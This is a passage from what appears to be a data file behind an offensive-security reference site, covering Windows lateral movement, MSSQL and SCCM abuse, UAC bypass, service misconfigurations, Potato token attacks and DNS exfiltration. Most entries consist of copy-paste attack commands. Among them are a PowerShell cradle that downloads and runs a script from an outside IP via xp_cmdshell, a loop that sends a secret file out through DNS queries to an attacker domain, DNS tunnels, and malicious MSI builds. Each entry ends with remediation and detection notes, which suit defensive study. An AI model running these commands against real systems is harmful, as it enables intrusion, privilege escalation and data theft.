        brief: "Once you hold a working credential (password, hash, or ticket), Windows offers many legitimate remote-administration channels that double as lateral-movement vectors: SMB service creation (PsExec/SMBExec), WMI (WMIExec), WinRM (evil-winrm), and RDP (xfreerdp). Each authenticates, runs your command as the target user or SYSTEM, and returns output.\n\nImpact: this is how a single valid admin credential becomes execution on dozens of hosts. The vectors differ in noise and artifacts, so attackers pick the quietest one that works.",
        quickReference: [
          { label: "PsExec (SMB service, SYSTEM shell)", cmd: "psexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10" },
          { label: "WMIExec (semi-interactive, fileless-ish)", cmd: "wmiexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10" },
          { label: "WinRM (evil-winrm, quiet)", cmd: "evil-winrm -i 10.10.10.10 -u Administrator -p 'Passw0rd'" },
          { label: "RDP (graphical)", cmd: "xfreerdp /u:Administrator /p:'Passw0rd' /v:10.10.10.10 /dynamic-resolution" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm where the credential grants admin (NetExec)", cmd: "netexec smb 10.10.10.0/24 -u Administrator -p 'Passw0rd'\n# (Pwn3d!) on a host means admin -> pick an execution vector below" },
              { label: "2. PsExec — creates a service over SMB, runs as SYSTEM (loud but reliable)", cmd: "psexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10\n# uploads a binary to ADMIN$, registers+starts a service -> nt authority\\system" },
              { label: "3. WMIExec — execute via WMI, no service/binary dropped (quieter)", cmd: "wmiexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10\n# runs as the user (not SYSTEM); good when service creation is monitored" },
              { label: "4. WinRM — management protocol, native remoting (blends with admin traffic)", cmd: "evil-winrm -i 10.10.10.10 -u Administrator -p 'Passw0rd'\n# with a hash:  evil-winrm -i 10.10.10.10 -u Administrator -H <nthash>\n# requires the account in Remote Management Users / WinRM enabled (5985/5986)" },
              { label: "5. RDP — interactive desktop (when GUI access is needed)", cmd: "xfreerdp /u:'corp.local\\\\Administrator' /p:'Passw0rd' /v:10.10.10.10 /cert:ignore\n# Restricted Admin mode enables pass-the-hash RDP:  /pth:<nthash>" },
              { label: "6. SMBExec / atexec alternatives", cmd: "smbexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10   # semi-interactive, no output file on some variants\natexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10 whoami  # via Task Scheduler" }
            ]
          },
          {
            title: "Vectors Compared",
            type: "table",
            columns: ["Vector", "Runs as / notes"],
            rows: [
              ["PsExec (SMB + service)", "SYSTEM; reliable, but service creation is noisy (event 7045)"],
              ["SMBExec", "SYSTEM; similar to PsExec, slightly different artifacts"],
              ["WMIExec (WMI)", "The user; no binary/service dropped — quieter"],
              ["WinRM (evil-winrm)", "The user; blends with legitimate remote management"],
              ["RDP (xfreerdp)", "Interactive desktop; Restricted Admin allows PtH"],
              ["AtExec (Task Scheduler)", "SYSTEM; one-shot command execution"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain a valid credential/hash/ticket", "Authentication material"],
              ["2", "NetExec-map where it is admin", "List of executable targets"],
              ["3", "Pick the quietest working vector", "Code execution on the target"],
              ["4", "Dump creds / act, then repeat", "Chain across the network"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket psexec/smbexec/wmiexec/atexec", "Remote execution over SMB/WMI/Task Scheduler"],
              ["evil-winrm", "Interactive WinRM shell (password or hash)"],
              ["xfreerdp / rdesktop", "RDP, including Restricted Admin PtH"],
              ["NetExec", "Map admin access and run commands at scale (-x / -X)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1021 — Remote Services", url: "https://attack.mitre.org/techniques/T1021/" },
              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Restrict local admin and Remote Management Users membership; enforce the principle of least privilege for remote access.",
              "Enable the Windows Firewall to limit SMB/WMI/WinRM/RDP to management subnets and jump hosts only.",
              "Enforce tiered administration and use Restricted Admin / Remote Credential Guard for RDP to avoid exposing credentials.",
              "Enable command-line and PowerShell logging; alert on service creation (7045), remote WMI, and new WinRM sessions.",
              "Detect: Impacket artifacts (randomly named services, ADMIN$ writes, __output files) and lateral admin logons (4624 type 3)."
            ]
          }
        ]
      },
      {
        id: "mssql-lateral",
        name: "MSSQL Lateral Movement",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1210/",
        theory: "theory/2026-08-18-ad-fundamentals.html",
        description: "Abuse SQL Server logins and trusted database links to execute OS commands and hop between servers — even across forest trusts.",
        brief: "SQL Server is deeply integrated with AD: domain users can be SQL logins, sysadmins can run OS commands via xp_cmdshell, and 'linked servers' let one instance run queries (and commands) on another. Attackers enumerate reachable instances, escalate within them, execute OS commands, and traverse database links to pivot between hosts.\n\nImpact: a foothold on one SQL server frequently leads to code execution on it (as the service account) and onward to other linked instances — a movement path that works even across forest trusts.",
        quickReference: [
          { label: "Find/authenticate to an instance", cmd: "netexec mssql 10.10.10.10 -u svc_sql -p 'Passw0rd' -q 'SELECT @@version'" },
          { label: "OS command via xp_cmdshell", cmd: "powershell Invoke-SQLOSCmd -Instance sql01.corp.local -Command 'whoami' -RawResults" },
          { label: "Enumerate + crawl linked servers", cmd: "Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose" },
          { label: "Impacket shell", cmd: "mssqlclient.py corp.local/svc_sql:'Passw0rd'@10.10.10.10 -windows-auth" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Discover instances you can reach (SPNs / UDP / creds)", cmd: "# from inside the domain, SQL SPNs reveal instances:\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n# test a login:\nnetexec mssql 10.10.10.10 -u 'corp.local\\svc' -p 'Passw0rd'" },
              { label: "2. Execute OS commands via xp_cmdshell (PowerUpSQL auto-enables it)", cmd: "powershell Invoke-SQLOSCmd -Instance sql01.corp.local -Command 'whoami' -RawResults\n# Invoke-SQLOSCmd enables xp_cmdshell if disabled, runs, then disables it again\n# manual: EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n#         EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';" },
              { label: "3. Impersonate a more privileged login (EXECUTE AS)", cmd: "# if your login can impersonate sa or a sysadmin:\nEXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; -- now sysadmin\n# PowerUpSQL: Invoke-SQLAudit / Invoke-SQLEscalatePriv -Instance sql01" },
              { label: "4. Crawl trusted database links to reach other servers", cmd: "Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose\n# run a query (or command) on a linked instance:\nGet-SQLServerLinkCrawl -Instance sql01 -Query 'exec master..xp_cmdshell ''whoami'''\n# links can chain across servers and even across forest trusts" },
              { label: "5. Get a shell / reverse shell from a linked instance", cmd: "Get-SQLServerLinkCrawl -Instance sql01 -Query \"exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/p.ps1'')'\"" }
            ]
          },
          {
            title: "Abuse Primitives",
            type: "table",
            columns: ["Primitive", "Detail"],
            rows: [
              ["xp_cmdshell", "OS command execution as the SQL service account (needs sysadmin)"],
              ["EXECUTE AS / impersonation", "Escalate from a low login to sysadmin within the instance"],
              ["Linked servers", "Run queries/commands on a remote instance the current one trusts"],
              ["Link crawling", "Chain multiple links to reach far instances, across forest trusts"],
              ["UNC path / xp_dirtree", "Coerce the service account to authenticate to you (relay/roast)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Enumerate reachable SQL instances", "Login targets"],
              ["2", "Authenticate / impersonate to sysadmin", "Full control of the instance"],
              ["3", "xp_cmdshell for OS execution", "Code execution as the service account"],
              ["4", "Crawl linked servers", "Pivot to other SQL hosts / forests"],
              ["5", "Repeat / dump creds", "Broader compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerUpSQL", "Discovery, xp_cmdshell, impersonation, link crawling"],
              ["Impacket mssqlclient.py", "Interactive SQL shell (Windows auth / hash)"],
              ["NetExec (mssql)", "Auth, query, and command execution at scale"],
              ["mssql-relay / xp_dirtree", "Coerce the service account for relay/roasting"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Lateral Movement (MSSQL)", url: "https://hadess.io/" },
              { label: "PowerUpSQL wiki", url: "https://github.com/NetSPI/PowerUpSQL/wiki" },
              { label: "The Hacker Recipes — MSSQL", url: "https://www.thehacker.recipes/ad/movement/mssql" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Keep xp_cmdshell disabled and deny sysadmin to application/service logins; grant least privilege.",
              "Avoid linked servers configured with high-privilege credentials; use least-privilege link accounts and audit link chains.",
              "Run SQL Server as a low-privileged (gMSA) service account so xp_cmdshell execution is contained.",
              "Restrict network access to SQL ports (1433/UDP 1434) to application tiers only.",
              "Detect: xp_cmdshell enablement/execution, EXECUTE AS to sysadmin, and cross-instance link queries."
            ]
          }
        ]
      },
      {
        id: "sccm-abuse",
        name: "SCCM / ConfigMgr Abuse",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1072/",
        theory: "theory/2026-08-18-ad-fundamentals.html",
        description: "Microsoft SCCM manages endpoints with powerful accounts and can deploy code fleet-wide — its Network Access Account, Client Push, and app deployment are all abusable.",
        brief: "System Center Configuration Manager (SCCM/ConfigMgr) is a fleet-management platform: it stores privileged accounts (the Network Access Account), can be made to authenticate to endpoints (Client Push), and can deploy applications and scripts to any managed device. Each of these is an attacker primitive.\n\nImpact: harvesting the NAA yields a domain credential; coercing Client Push captures the client-push account's authentication (crack or relay); and application/script deployment is authenticated remote code execution across every managed endpoint — a route to mass compromise from a single SCCM role abuse.",
        quickReference: [
          { label: "Harvest the Network Access Account (NAA)", cmd: "SharpSCCM.exe local secrets disk   (or: local secrets wmi)" },
          { label: "Coerce Client Push, capture NTLM", cmd: "responder -I eth0   (then trigger a client-push notification to your host)" },
          { label: "Enumerate your SCCM rights", cmd: "SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p RoleNames" },
          { label: "Deploy an app for RCE on a device", cmd: "SharpSCCM.exe exec -rid <ResourceID> -r <attacker_ip>" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Harvest the Network Access Account from a client (DPAPI-protected)", cmd: "# the NAA policy is stored, DPAPI-encrypted, in the CIM/WMI store on every client\nSharpSCCM.exe local secrets disk     # decrypt from the CIM store on disk\nSharpSCCM.exe local secrets wmi      # or from WMI\n# mimikatz # dpapi::sccm   also recovers it\n# NAA is a domain account -> immediate credential, sometimes over-privileged" },
              { label: "2. Coerce Client Push and capture the push account's NTLM", cmd: "# stand up a listener, then trigger client-push installation toward it\nresponder -I eth0\n# SharpSCCM.exe invoke client-push -t attacker_ip   (or via the console)\n# captures the Client Push account (local admin on all clients) + machine account\n# crack (hashcat -m 5600) or relay it" },
              { label: "3. Enumerate your effective SCCM privileges", cmd: "SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p RoleNames -p LogonName\n# 'Full Administrator' on the compromised user = fleet-wide deployment rights" },
              { label: "4. Deploy an application/script to a target device (authenticated RCE)", cmd: "# find an active client and its ResourceID\nSharpSCCM.exe get devices -w \"Active=1 and Client=1\"\n# execute against it (relay/capture NTLM, or run as the logged-on user / SYSTEM)\nSharpSCCM.exe exec -rid 16777220 -r attacker_ip                 # capture NTLM\nSharpSCCM.exe exec -rid 16777220 -r attacker_ip --run-as-system # run as SYSTEM" },
              { label: "5. Clean up deployment artifacts", cmd: "# delete the created application/device collection and deployment after use" }
            ]
          },
          {
            title: "SCCM Attack Primitives",
            type: "table",
            columns: ["Primitive", "Detail"],
            rows: [
              ["Network Access Account (NAA)", "Domain account stored DPAPI-encrypted on every client — decrypt it"],
              ["Client Push", "Coerce SCCM to authenticate with the push account (local admin on all clients)"],
              ["Application/Script deployment", "Authenticated code execution on any managed device"],
              ["Policy secrets", "NAA and other secrets fetchable from Management Points"],
              ["Persistence after change", "Old NAA binaries remain decryptable on enrolled hosts"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Foothold on an SCCM client or admin", "Access to CIM store / SCCM console"],
              ["2", "Harvest NAA / coerce Client Push", "Domain credential / captured NTLM"],
              ["3", "Enumerate SCCM role (Full Administrator?)", "Deployment capability"],
              ["4", "Deploy app/script to targets", "RCE across managed endpoints"],
              ["5", "Relay captured auth / reuse NAA", "Mass compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["SharpSCCM", "NAA harvest, Client Push, enumeration, deployment"],
              ["Mimikatz (dpapi::sccm)", "Decrypt the NAA from DPAPI"],
              ["Responder / ntlmrelayx", "Capture/relay the coerced Client Push authentication"],
              ["SharpDPAPI", "Alternative DPAPI decryption of SCCM secrets"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Lateral Movement (SCCM)", url: "https://hadess.io/" },
              { label: "SharpSCCM wiki", url: "https://github.com/Mayyhem/SharpSCCM/wiki" },
              { label: "MITRE ATT&CK T1072 — Software Deployment Tools", url: "https://attack.mitre.org/techniques/T1072/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Avoid the Network Access Account where possible (use Enhanced HTTP); if used, make it a least-privilege domain account.",
              "Disable Client Push installation, or enforce it to require Kerberos and disallow NTLM fallback.",
              "Restrict SCCM 'Full Administrator' and deployment rights; treat the primary site server as Tier-0.",
              "Require SMB signing and LDAP channel binding so captured SCCM authentications cannot be relayed.",
              "Detect: SharpSCCM activity, anomalous application deployments, and Client Push authentications to non-SCCM hosts."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Privilege Escalation",
    vulns: [
      {
        id: "uac-bypass",
        name: "UAC Bypass",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1548/002/",
        theory: "theory/2026-08-18-windows-tokens-uac.html",
        description: "Abuse Windows auto-elevating binaries and trusted-path logic to run code with a full admin token from a filtered medium-integrity process — no consent prompt.",
        brief: "When an administrator is logged in, most processes run with a filtered (medium-integrity) token; a full admin token requires a UAC consent prompt. Certain signed Microsoft binaries <em>auto-elevate</em> without prompting, and several read attacker-controllable registry keys or load libraries from writable/normalised paths. Hijacking one of those lets a medium-integrity process spawn a high-integrity one silently.\n\nImpact: UAC is a convenience boundary, not a security boundary — a bypass turns 'admin but not elevated' into full local administrator without alerting the user, the usual first step before dumping credentials or installing persistence.",
        quickReference: [
          { label: "Check integrity level", cmd: "whoami /groups | findstr Label   (Medium = not elevated)" },
          { label: "fodhelper (registry hijack)", cmd: "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\nfodhelper.exe" },
          { label: "Automated (many techniques)", cmd: "UACME (akagi.exe) -m <method>   ;   metasploit bypassuac_* modules" },
          { label: "eventvwr / sdclt / computerdefaults", cmd: "similar HKCU registry hijacks against other auto-elevating binaries" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm you are admin but only medium integrity", cmd: "whoami /groups | findstr /i \"Label\"\n# 'Mandatory Label\\Medium Mandatory Level' = filtered token, UAC in the way\n# your user must be in the local Administrators group for elevation to be possible" },
              { label: "2. fodhelper — hijack the ms-settings handler it auto-elevates through", cmd: "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nfodhelper.exe\n# fodhelper auto-elevates, reads the HKCU handler, and launches your command HIGH integrity\nreg delete \"HKCU\\Software\\Classes\\ms-settings\" /f   # clean up" },
              { label: "3. Other auto-elevating binaries follow the same pattern", cmd: "# eventvwr.exe  -> HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n# sdclt.exe     -> HKCU\\Software\\Classes\\Folder\\shell\\open\\command  / exefile\n# computerdefaults.exe -> ms-settings (same as fodhelper)" },
              { label: "4. Trusted-directory / DLL-hijack variants (path normalization)", cmd: "# create a 'mock' trusted dir like C:\\Windows \\System32\\ (trailing space) and drop a\n# hijacked DLL an auto-elevating binary loads; the trusted-path check is fooled\n# UACME automates dozens of these (akagi.exe -m <n>)" },
              { label: "5. Automate the whole thing", cmd: "# UACME implements 70+ methods across Windows versions\nakagi.exe 33 C:\\temp\\payload.exe\n# metasploit: use exploit/windows/local/bypassuac_fodhelper (set SESSION)" }
            ]
          },
          {
            title: "Why Bypasses Exist",
            type: "table",
            columns: ["Mechanism", "Detail"],
            rows: [
              ["Auto-elevation", "Some signed MS binaries elevate with no prompt (autoElevate=true in the manifest)"],
              ["HKCU handler hijack", "They read program IDs / handlers from HKCU, which a medium process can write"],
              ["Path normalization", "Trusted-directory checks can be fooled with mock dirs (trailing space/dot)"],
              ["DLL search order", "An auto-elevating binary loads a DLL from a writable/normalised path"],
              ["Not a security boundary", "Microsoft does not service UAC bypasses as vulnerabilities"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Admin user, medium-integrity process", "Filtered token, need elevation"],
              ["2", "Plant an HKCU handler / hijack DLL", "Attacker-controlled elevation path"],
              ["3", "Launch the auto-elevating binary", "It runs your command high-integrity"],
              ["4", "Clean up the registry/DLL artifacts", "Silent full-admin token"],
              ["5", "Dump creds / persist as admin", "Consolidated local compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["UACME (akagi)", "70+ implemented UAC bypass methods"],
              ["reg.exe / PowerShell", "Plant the HKCU handler for the manual techniques"],
              ["Metasploit bypassuac_* modules", "Automated bypass from a session"],
              ["Process Explorer / sigcheck", "Find auto-elevating (autoElevate) binaries"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1548.002 — Bypass User Account Control", url: "https://attack.mitre.org/techniques/T1548/002/" },
              { label: "UACME — UAC bypass collection", url: "https://github.com/hfiref0x/UACME" },
              { label: "Hadess — UAC Evasion", url: "https://hadess.io/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set UAC to the highest level (Always Notify) so even auto-elevating binaries prompt.",
              "Do not let daily-use accounts be local administrators; use a separate admin account and a PAW for admin tasks.",
              "Monitor HKCU handler keys (ms-settings, mscfile, Folder\\shell\\open\\command) and auto-elevating binaries spawning shells.",
              "Application allow-listing (WDAC/AppLocker) limits what an elevated child can run.",
              "Detect: fodhelper/eventvwr/sdclt/computerdefaults launching cmd/powershell, and writes to the known hijack registry paths."
            ]
          }
        ]
      },
      {
        id: "windows-service-privesc",
        name: "Service & Registry Misconfigurations",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1543/003/",
        theory: "theory/2026-08-18-windows-tokens-uac.html",
        description: "Weak service permissions, unquoted service paths, writable service binaries, and AlwaysInstallElevated let a normal user run code as SYSTEM.",
        brief: "Windows services usually run as SYSTEM, so any weakness that lets a low-privileged user influence what a service executes is a direct path to SYSTEM. The classics: a service whose configuration you can change (weak service DACL), a service binary or its folder you can overwrite, an unquoted path containing spaces, or the AlwaysInstallElevated policy.\n\nImpact: these are the bread-and-butter of Windows local privilege escalation — a single misconfiguration on one host promotes a foothold to full local control, from where credential dumping and lateral movement follow.",
        quickReference: [
          { label: "Auto-enumerate privesc paths", cmd: "winPEAS.exe   ;   PowerUp: Invoke-AllChecks   ;   Seatbelt.exe -group=all" },
          { label: "Weak service DACL — repoint + run", cmd: "sc config <svc> binPath= \"C:\\temp\\rev.exe\" & sc start <svc>   (needs SERVICE_CHANGE_CONFIG)" },
          { label: "Unquoted service path", cmd: "Drop C:\\Program.exe for 'C:\\Program Files\\...\\svc.exe' unquoted, then restart the service" },
          { label: "AlwaysInstallElevated", cmd: "msfvenom -f msi -o evil.msi ... ; msiexec /quiet /qn /i evil.msi   (runs as SYSTEM)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate — let a tool find the winnable misconfig", cmd: "# any of these surfaces weak services, unquoted paths, writable dirs, GPP, AutoLogon...\nwinPEASx64.exe quiet\npowershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"\nSeatbelt.exe -group=all" },
              { label: "2. Weak service permissions — you can reconfigure the service", cmd: "# accesschk shows SERVICE_CHANGE_CONFIG for your group:\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\nsc config vulnsvc binPath= \"C:\\Windows\\Temp\\rev.exe\"\nsc stop vulnsvc & sc start vulnsvc   # rev.exe runs as the service account (often SYSTEM)" },
              { label: "3. Unquoted service path — Windows tries each space-split prefix", cmd: "# 'C:\\Program Files\\Vuln Service\\svc.exe' unquoted -> tries C:\\Program.exe first\nsc qc vulnsvc | findstr BINARY_PATH_NAME   # confirm no quotes + a space + a writable dir\ncopy rev.exe \"C:\\Program Files\\Vuln.exe\"   # if that folder is writable\nsc stop vulnsvc & sc start vulnsvc" },
              { label: "4. Writable service binary — just overwrite it", cmd: "# if you can write the .exe or its folder:\ncopy /y rev.exe \"C:\\Path\\To\\service.exe\"\nsc stop vulnsvc & sc start vulnsvc   # or wait for a reboot" },
              { label: "5. AlwaysInstallElevated — MSI installs run as SYSTEM", cmd: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# both = 1 ->\nmsfvenom -p windows/x64/exec CMD='net localgroup administrators user /add' -f msi -o e.msi\nmsiexec /quiet /qn /i e.msi" }
            ]
          },
          {
            title: "Misconfiguration Classes",
            type: "table",
            columns: ["Class", "Why it escalates"],
            rows: [
              ["Weak service DACL", "Reconfigure the service binPath → run your code as SYSTEM"],
              ["Unquoted service path", "A writable higher-level directory + space lets Windows run your exe"],
              ["Writable service binary/dir", "Overwrite the executable a SYSTEM service runs"],
              ["AlwaysInstallElevated", "Any MSI installs with SYSTEM privileges"],
              ["Weak registry (service Image​Path)", "Change the binary a service loads via its registry key"],
              ["DLL hijacking / missing DLL", "A SYSTEM process loads a DLL from a writable path"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Enumerate host with winPEAS/PowerUp", "Concrete misconfiguration"],
              ["2", "Weaponise it (repoint/overwrite/MSI)", "Payload set to run as SYSTEM"],
              ["3", "Trigger (restart service / reboot / msiexec)", "Execution as SYSTEM"],
              ["4", "Dump creds / persist", "Full host control"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["winPEAS / Seatbelt", "Automated privilege-escalation enumeration"],
              ["PowerUp (PowerSploit)", "Find and auto-abuse service/registry misconfigs"],
              ["accesschk (Sysinternals)", "Confirm object DACLs (who can change a service)"],
              ["sc.exe / msiexec / msfvenom", "Reconfigure services, install MSI, build payloads"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1543.003 — Windows Service", url: "https://attack.mitre.org/techniques/T1543/003/" },
              { label: "HackTricks — Windows local privilege escalation", url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Quote all service binary paths and audit service DACLs so non-admins cannot change configuration.",
              "Restrict write access to service executables and their directories (Program Files should not be user-writable).",
              "Never enable AlwaysInstallElevated; it is a direct SYSTEM primitive for any user.",
              "Run services with the least privilege necessary (a low-priv or gMSA account rather than SYSTEM where possible).",
              "Detect: service binPath changes (event 7040/4697), new services, and MSI installs from user context."
            ]
          }
        ]
      },
      {
        id: "token-impersonation",
        name: "Token Impersonation (Potato Attacks)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1134/001/",
        theory: "theory/2026-08-18-windows-tokens-uac.html",
        description: "A service account holding SeImpersonatePrivilege can coerce a SYSTEM authentication and impersonate its token to become SYSTEM.",
        brief: "Windows service accounts (IIS, MSSQL, and many others) typically hold <code>SeImpersonatePrivilege</code> — the right to impersonate a token they receive. The 'Potato' family abuses this: coerce a privileged (SYSTEM) process to authenticate to a local listener, capture its token, and impersonate it.\n\nImpact: this turns the common 'I have code execution as a low-privileged service account' situation into SYSTEM on the box — the standard escalation after landing a web shell or SQL command execution as a service identity.",
        quickReference: [
          { label: "Check for the privilege", cmd: "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"" },
          { label: "PrintSpoofer (modern, reliable)", cmd: "PrintSpoofer.exe -i -c cmd.exe" },
          { label: "RoguePotato / GodPotato", cmd: "GodPotato.exe -cmd \"cmd /c whoami\"" },
          { label: "JuicyPotato (older Windows)", cmd: "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c payload\" -t *" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm SeImpersonatePrivilege on your (service) account", cmd: "whoami /priv | findstr /i \"SeImpersonatePrivilege\"\n# common as IIS APPPOOL\\..., NT SERVICE\\MSSQL..., or after landing a webshell/xp_cmdshell" },
              { label: "2. PrintSpoofer — coerce the spooler's SYSTEM auth (Win10/2019+)", cmd: "PrintSpoofer.exe -i -c cmd.exe\n#   -i   interact with the spawned process\n#   -c   command to run as SYSTEM\n# abuses the print spooler's named-pipe to hand you a SYSTEM token" },
              { label: "3. GodPotato / RoguePotato — DCOM/OXID coercion (broad version support)", cmd: "GodPotato.exe -cmd \"cmd /c net localgroup administrators lowuser /add\"\n# RoguePotato.exe -r <attacker_ip> -e \"cmd.exe\" -l 9999" },
              { label: "4. JuicyPotato — classic (older Windows, before the OXID fixes)", cmd: "JuicyPotato.exe -l 1337 -p c:\\temp\\rev.exe -t * -c {CLSID}\n# pick a CLSID that runs as SYSTEM for the target OS" },
              { label: "5. You are now SYSTEM", cmd: "whoami   # nt authority\\system  ->  dump LSASS / SAM, then move laterally" }
            ]
          },
          {
            title: "The Potato Family",
            type: "table",
            columns: ["Tool", "Best for"],
            rows: [
              ["PrintSpoofer", "Windows 10 / Server 2016-2019+, spooler named-pipe coercion"],
              ["RoguePotato", "Post-JuicyPotato OXID resolver fix; needs a redirector"],
              ["GodPotato", "Broad modern coverage via DCOM"],
              ["JuicyPotato", "Older Windows (pre-2019) using a SYSTEM CLSID"],
              ["Common requirement", "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Code execution as a service account", "Context with SeImpersonate"],
              ["2", "Run a Potato tool", "Coerce a SYSTEM authentication locally"],
              ["3", "Impersonate the captured SYSTEM token", "Execute as SYSTEM"],
              ["4", "Dump credentials / persist", "Full host compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PrintSpoofer", "Spooler-based SYSTEM impersonation"],
              ["GodPotato / RoguePotato", "DCOM/OXID-based impersonation on modern Windows"],
              ["JuicyPotato", "CLSID-based impersonation on older Windows"],
              ["whoami /priv", "Confirm the required privilege"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1134.001 — Token Impersonation/Theft", url: "https://attack.mitre.org/techniques/T1134/001/" },
              { label: "The Hacker Recipes — Abusing tokens", url: "https://www.thehacker.recipes/ad/movement/access-tokens" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Remove SeImpersonatePrivilege from service accounts that do not require it, and run services least-privileged.",
              "Keep Windows patched; several Potato variants depend on specific unpatched behaviours.",
              "Disable the Print Spooler where it is not needed (also mitigates PrinterBug coercion).",
              "Contain web/SQL service accounts (separate hosts, restricted rights) so a foothold cannot reach SYSTEM easily.",
              "Detect: named-pipe/DCOM coercion patterns and a service account spawning SYSTEM processes."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Exfiltration",
    vulns: [
      {
        id: "dns-exfiltration",
        name: "DNS Exfiltration & Tunneling",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1048/",
        description: "Encode stolen data into DNS queries so it leaves the network through resolvers that firewalls rarely block or inspect.",
        brief: "DNS is almost always allowed outbound and is rarely deep-inspected, which makes it an ideal covert exfiltration channel. Data is encoded (hex/base32) into the labels of queries for a domain the attacker controls; the authoritative name server they run receives and reassembles it. Interactive tunnels (dnscat2, iodine) build a full bidirectional channel this way.\n\nImpact: an attacker can slowly exfiltrate credentials, files, or command output — and even run an interactive C2 channel — from a segmented network that blocks direct outbound connections, using only DNS.",
        quickReference: [
          { label: "Manual exfil (data in the subdomain)", cmd: "for c in $(cat secret|base32|tr -d '='); do nslookup $c.exfil.attacker.com; done" },
          { label: "dnscat2 (interactive C2 tunnel)", cmd: "server: dnscat2-server exfil.attacker.com\nclient: dnscat2 exfil.attacker.com" },
          { label: "iodine (IP-over-DNS tunnel)", cmd: "server: iodined -f 10.0.0.1 tunnel.attacker.com\nclient: iodine tunnel.attacker.com" },
